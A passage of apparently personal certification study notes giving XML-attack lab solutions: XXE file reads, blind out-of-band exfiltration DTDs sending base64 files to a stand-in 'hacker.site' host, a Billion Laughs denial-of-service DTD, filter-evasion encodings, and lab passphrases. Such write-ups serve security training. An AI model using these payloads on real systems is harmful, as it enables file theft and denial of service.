+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh php://filter/convert.base64-encode/resource<span class="o">=</span>/var/www /3/.letmepass <span class="se">\</span>
+| <span class="nb">awk</span> <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }'</span> <span class="se">\</span>
+| <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span> <span class="se">\</span>
+| <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> whaat.php
+
+<span class="nb">echo</span> <span class="s1">'var_dump($config);'</span> <span class="o">&gt;&gt;</span> whaat.php | php whaat.php
+</code></pre></div></div>
+
+<h3 id="solutions---lab-4">Solutions - Lab #4</h3>
+
+<p>A png file contains the solution:</p>
+
+<p><em>Do you like ASCII? I do!</em>
+Exploitation steps</p>
+
+<p>Download the base64 encoded the content of .letmepass:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh php://filter/convert.base64-encode/resource<span class="o">=</span>/var/www/4/.letmepass.php
+</code></pre></div></div>
+
+<p>Extract the content from the result:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Step 1] | gawk <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }'</span>
+</code></pre></div></div>
+
+<p>Remove the JSON escaping characters:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Steps 1|2] | <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>
+</code></pre></div></div>
+
+<p>Base64 decode and store result within a file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Steps 1|2|3] | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> wohoo.png
+
+OR
+
+<span class="o">[</span>Steps 1|2|3] | <span class="nb">base64</span> <span class="nt">-D</span> <span class="o">&gt;</span> wohoo.png
+</code></pre></div></div>
+
+<ul>
+  <li>Open the file</li>
+</ul>
+
+<p>Testing command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh php://filter/convert.base64-encode/resource<span class="o">=</span>/var/www/4/.letmepass <span class="se">\</span>
+| <span class="nb">awk</span> <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }'</span> <span class="se">\</span>
+| <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span> <span class="se">\</span>
+| <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> wohoo.png
+
+open wohoo.png
+</code></pre></div></div>
+
+<h3 id="solutions---lab-5">Solutions - Lab #5</h3>
+
+<p>In a folder full of files, there is a special one…:</p>
+
+<p><em>Wheres the hidden file?</em></p>
+
+<p>Exploitation steps</p>
+
+<p>The solution within basexml.php.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Part 1
+
+- Download the <span class="nb">base64 </span>encoded the content of .letmepass.
+- Extract the content from the result.
+- Remove the JSON escaping characters.
+- Base64 decode and store result within a file.
+</code></pre></div></div>
+
+<p>Part 2</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Download a list of common PHP file names<span class="p">;</span> this is a good resource: Filenames_PHP_Common.wordlist @ <span class="o">(</span>http://blog.thireus.com/web-common-directories-and-filenames-word-lists-collection<span class="o">)</span>
+- Automate the retrieving process:
+- Similar to Part 1
+- Parse result and show the good file that contains the tag <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Testing command:</p>
+
+<p>Part 1</p>
+
+<p>Extract instructions from .letmepass:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh /var/www/5/.letmepass
+</code></pre></div></div>
+
+<p>Part 2</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./file_extractor.sh /var/www/5/hidden/
+</code></pre></div></div>
+
+<h3 id="solutions---lab-6">Solutions - Lab #6</h3>
+
+<p>Blind XXE here. IT requires some OOB exploitations:</p>
+
+<p><em>Get out of here!!</em>
+Exploitation steps</p>
+
+<p>The solution is within .letmepass.php; this is a blind XXE exploitation, so you need to set up an OOB channel.</p>
+
+<p>Here are the steps:</p>
+
+<p>Craft the XML payload moving the external entity definitions in another DTD file (evil_oob.dtd)</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span>
+<span class="cp">&lt;!DOCTYPE xxe [
+    &lt;!ENTITY % EvilDTD SYSTEM 'http://hacker.site/evil_oob.dtd'&gt;</span>
+    %EvilDTD;
+    %LoadOOBEnt;
+    %OOB;
+]&gt;
+<span class="nt">&lt;login&gt;</span>
+    <span class="nt">&lt;username&gt;</span>XXEME<span class="nt">&lt;/username&gt;</span>
+    <span class="nt">&lt;password&gt;</span>password<span class="nt">&lt;/password&gt;</span>
+<span class="nt">&lt;/login&gt;</span>
+</code></pre></div></div>
+
+<p>Create evil_oob.dtd as follows:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/6/.letmepass.php"&gt;</span>
+<span class="cp">&lt;!ENTITY % LoadOOBEnt "&lt;!ENTITY &amp;#x25; OOB SYSTEM 'http://hacker.site:2108/?p=%resource;'&gt;</span>"&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] http://hacker.site:2108/xml?p=%resource is the path where the xxeserve shell is listening; you can change it with what you want.</p>
+</blockquote>
+
+<ul>
+  <li>Run the xxeserve script</li>
+</ul>
+
+<p>ruby xxeserve.rb</p>
+
+<blockquote>
+  <p>[Note] You can improve xxeserve by adding the following lines. With this way, you can customize the port and host to use:</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set</span> :bind, <span class="s1">'hacker.site'</span>
+<span class="nb">set</span> :port, 2108
+</code></pre></div></div>
+
+<p>Base64 Decode</p>
+
+<p>Decode what the shell has received! Check the files folder</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>files/<span class="o">{</span>IP.TIME<span class="o">}</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+
+<h3 id="solutions---lab-7">Solutions - Lab #7</h3>
+
+<p>In a folder full of files, there is a special one… the flaw is blind:</p>
+
+<p><em>Get out of here, but wait… wheres the hidden file?!</em></p>
+
+<p>Exploitation steps</p>
+
+<p>The solution is in Background.php; this is a blind XXE exploitation, so you need to set up an OOB channel.</p>
+
+<p>Here are the steps:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Retrieve the .letmepass file for instructions
+- Automate the retrieving process
+</code></pre></div></div>
+
+<p>a. Retrieve the .letmepass file for instructions</p>
+
+<p>Craft the XML payload moving the external entity definitions in another DTD file (evil_oob.dtd)</p>
+
+<p>File: exploit.sh</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span> 
+<span class="cp">&lt;!DOCTYPE xxe [
+    &lt;!ENTITY % EvilDTD SYSTEM 'http://hacker.site/evil_oob.dtd'&gt;</span>
+    %EvilDTD;
+    %LoadOOBEnt;
+    %OOB;
+]&gt;
+<span class="nt">&lt;login&gt;</span> 
+    <span class="nt">&lt;username&gt;</span>XXEME<span class="nt">&lt;/username&gt;</span> 
+    <span class="nt">&lt;password&gt;</span>password<span class="nt">&lt;/password&gt;</span> 
+<span class="nt">&lt;/login&gt;</span>
+</code></pre></div></div>
+
+<p>File:
+evil_oob.dtd</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/7/.letmepass.php"&gt;</span> 
+<span class="cp">&lt;!ENTITY % LoadOOBEnt "&lt;!ENTITY &amp;#x25; OOB SYSTEM
+'http://hacker.site:2108/?p=%resource;'&gt;</span>"&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p>[NOTE] http://hacker.site:2108/xml?p=%resource
+is the path where &gt; the xxeserve shell is listening; you can change it with what you want.</p>
+</blockquote>
+
+<ul>
+  <li>Run the xxeserve script
+    <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="n">xxeserve</span><span class="p">.</span><span class="nf">rb</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>[NOTE] I added the following lines in order to customize port and host</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set</span> :bind, <span class="s1">'hacker.site'</span>
+<span class="nb">set</span> :port, 2108
+</code></pre></div></div>
+
+<p>Decode the .letmepass</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file
+</code></pre></div></div>
+
+<p>Decode what the shell has received! Check the files folder</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>files/<span class="o">{</span>IP.TIME<span class="o">}</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Clear all in files folder</li>
+</ul>
+
+<p>b. Automate the retrieving folder</p>
+
+<ul>
+  <li>Download a list of common PHP file names.</li>
+  <li>This is good: Filenames_PHP_Common.wordlist</li>
+</ul>
+
+<p>Make the file extractor script:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>See file_extractor.sh
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] there are some hardcoded paths within the script, you should adapt them respect to your configuration.</p>
+</blockquote>
+
+<p>Make a proxy script:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>See getOOB.php
+</code></pre></div></div>
+
+<blockquote>
+  <p>This script is useful, as it can echo custom XML payloads by just passing to it a GET request to resource to extract.</p>
+</blockquote>
+
+<h2 id="lab-3">Lab 3</h2>
+
+<p>Below, you can find solutions for each task. Remember, though, that you can follow your own strategy, which may be different from the one explained in the following lab.</p>
+
+<blockquote>
+  <p>[NOTE] The techniques to use during this lab are better explained in the study material. You should refer to it for further details. These solutions are provided here only to verify the correctness.</p>
+</blockquote>
+
+<h3 id="solutions---lab-1-2">Solutions - Lab #1</h3>
+
+<p>Simple XEE exploitation warm-up:</p>
+
+<p><em>You make me laugh so much!</em>
+Valid Passphrase</p>
+
+<p>The valid passphrase is We_don’t_like_DoS_attacks
+Exploitation Steps</p>
+
+<ul>
+  <li>Testing the login form, you’ll receive a hint that tells you to visit the stats path.</li>
+  <li>Open the stats path and check the Physical Memory percentage status.</li>
+  <li>Run the Billion laughs attack against the login parser. If the attack works properly, you’ll notice an alert box with the secret passphrase.</li>
+</ul>
+
+<h3 id="solutions---lab-2-2">Solutions - Lab #2</h3>
+<p>Simple XEE exploitation mixed with a simple XXE exploitation:</p>
+
+<p><em>We don’t forget how to exploit XXE</em>
+Valid Passphrase</p>
+
+<p>The valid passphrase is The_second_level_is_done!..like_a_boss
+Exploitation Steps</p>
+
+<ul>
+  <li>Testing the login form, you’ll receive a hint that tells you to visit the stats path.</li>
+  <li>Open the stats path and check the Physical Memory percentage status.</li>
+  <li>Run the Billion laughs attack against the login parser. If the attack works properly, you’ll notice an alert box with the instructions.</li>
+</ul>
+
+<p>Run an XXE attack to read the log file and clear some useless text</p>
+
+<p>Extract the content from the result. Use awk or gawk, depends on the system:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gawk <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;\s/, m) { print m[1] }'</span>
+</code></pre></div></div>
+
+<p>Remove the JSON escaping characters</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>
+</code></pre></div></div>
+
+<p>XEE DoS</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh
+</code></pre></div></div>
+
+<p>XXE log file extraction</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit_xxe.sh /var/www/XEE/2/LOGS/omg_a_dos.log <span class="se">\</span>
+| gawk <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;\s/, m) { print m[1] }'</span> <span class="se">\</span>
+| <span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>./exploit.sh
+</code></pre></div></div>
+
+<h3 id="solutions---lab3">Solutions - Lab#3</h3>
+
+<p>Simple XEE+XEE exploitation enriched with a little bit of encoding:</p>
+
+<p><em>We don’t forget how encoding works</em>
+Valid Passphrase</p>
+
+<p>The valid passphrase is The_second_level_is_done!..like_a_boss
+Exploitation Steps</p>
+
+<ul>
+  <li>Testing the login form, you’ll receive a hint that tells you to visit the stats path.</li>
+  <li>Open the stats path and check the Physical Memory percentage status.</li>
+  <li>Run the Billion laughs attack against the login parser. If the attack works properly, you’ll notice an alert box with the instructions.</li>
+  <li>Run an XXE attack to read the log file and clear some useless text</li>
+</ul>
+
+<p>Encode the log path</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%5BLOGS%5D/omg_%C3%A0_dos.log
+</code></pre></div></div>
+
+<p>Extract the content from the result. Use awk or gawk, depends on the system:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gawk <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;\s/, m) { print m[1] }'</span>
+</code></pre></div></div>
+
+<p>Remove JSON escaping characters:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>
+</code></pre></div></div>
+
+<p>Decode Unicode characters:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="si">$(</span>php <span class="nt">-r</span> <span class="s2">"echo html_entity_decode(preg_replace(</span><span class="se">\"</span><span class="s2">/%u([0-9a-f]{3,4})/i</span><span class="se">\"</span><span class="s2">,'&amp;#x</span><span class="se">\\</span><span class="s2">1;',str_replace('</span><span class="se">\u</span><span class="s2">', '%u', '</span><span class="nv">$cleaned</span><span class="s2">')),null,'UTF-8');"</span> <span class="p">;</span>
+</code></pre></div></div>
+
+<p>XEE DoS</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit.sh
+</code></pre></div></div>
+
+<p>XXE log file extraction</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit_xxe.sh /var/www/3/%5BLOGS%5D/omg_%C3%A0_dos.log
+</code></pre></div></div>
+
+<h3 id="solutions---lab4">Solutions - Lab#4</h3>
+
+<p>XEE+XXE exploitations mixed with filter evasion and character encodings:</p>
+
+<p><em>Ah filters … always throw a spanner in the works.</em>
+Valid Passphrase</p>
+
+<p>The valid passphrase is Escaping_and_evasion_like_a_boss
+Exploitation Steps</p>
+
+<ul>
+  <li>
+    <p>Testing the login form, youll receive a hint that tells you to visit the stats path.</p>
+  </li>
+  <li>
+    <p>Open the stats path and check the Physical Memory percentage status.</p>
+  </li>
+  <li>
+    <p>Run the Billion laughs attack against the login parser. If the attack works properly, youll notice an alert box with the instructions.</p>
+  </li>
+</ul>
+
+<blockquote>
+  <p>[NOTE] The server implements some filers to avoid XEE attacks. To exploit the flaw, the fastest solution is to move the Billion laughs attack in an external DTD file hosted on hacker.site (replace it with the IP address of your attacker machine), and then call it as follows:</p>
+</blockquote>
+
+<p>xml payload</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE results [
+    &lt;!ENTITY % EvilDTD PUBLIC "xxe"
+        "http://hacker.site/evil_remote_xee.dtd"&gt;</span>
+    %EvilDTD;
+]&gt;
+<span class="nt">&lt;login&gt;</span>
+    <span class="nt">&lt;username&gt;</span>XEEME <span class="ni">&amp;file;</span><span class="nt">&lt;/username&gt;</span>
+    <span class="nt">&lt;password&gt;</span>password<span class="nt">&lt;/password&gt;</span>
+<span class="nt">&lt;/login&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] make sure to replace hacker.site with the IP address of your attacker machine.</p>
+</blockquote>
+
+<p>file: evil_remote_xee.dtd</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY lol "lol"&gt;</span>
+<span class="cp">&lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span>
+<span class="cp">&lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;</span>
+<span class="cp">&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span>
+<span class="cp">&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span>
+<span class="cp">&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span>
+<span class="cp">&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span>
+<span class="cp">&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span>
+<span class="cp">&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span>
+<span class="cp">&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span>
+</code></pre></div></div>
+
+<p>Run an XXE attack to read the log file and clear useless text.</p>
+
+<blockquote>
+  <p>[NOTE] Due to some restrictions, to prevent XEE attacks, long URLs might break the payload. To bypass this limitation, we can move the payload in another external dtd as we did before.</p>
+</blockquote>
+
+<p>Encode the log path:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%7B%5B_%C4%BF.%C3%B2.%C4%9D.%C5%9B_%5D%7D%2F%F0%9D%95%86%E3%8E%8E%E2%80%A6%C3%A0%E2%80%A2d%F0%9D%93%B8s.%E3%8F%92
+</code></pre></div></div>
+
+<p>Extract the content from the result. Use awk or gawk, depends on the system:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gawk <span class="s1">'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;\s/, m) { print m[1] }'</span>
+</code></pre></div></div>
+
+<p>Remove JSON escaping characters:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'s/\\\//\//g'</span>
+</code></pre></div></div>
+
+<p>Useful Files:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit.sh
+exploit_xxe.sh
+external_dos.dtd
+evil_remote_xee.dtd
+</code></pre></div></div>
+
+<p>*XEE DoS *</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file: exploit.sh
+./exploit.sh
+</code></pre></div></div>
+
+<p>*XXE log file extraction *</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file: exploit_xxe.sh
+./exploit_xxe.sh
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-02T00:00:00+06:00">December 2, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=9+-+XML+Attacks%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fxmlattacks%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fxmlattacks%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fxmlattacks%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ewptx/sqlievasion/" class="pagination--pager" title="8 - SQLI Filter Evasion
+">Previous</a>
+    
+    
+      <a href="/notes/ewptx/zattackingserialization/" class="pagination--pager" title="10 - Attacking Serialization
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
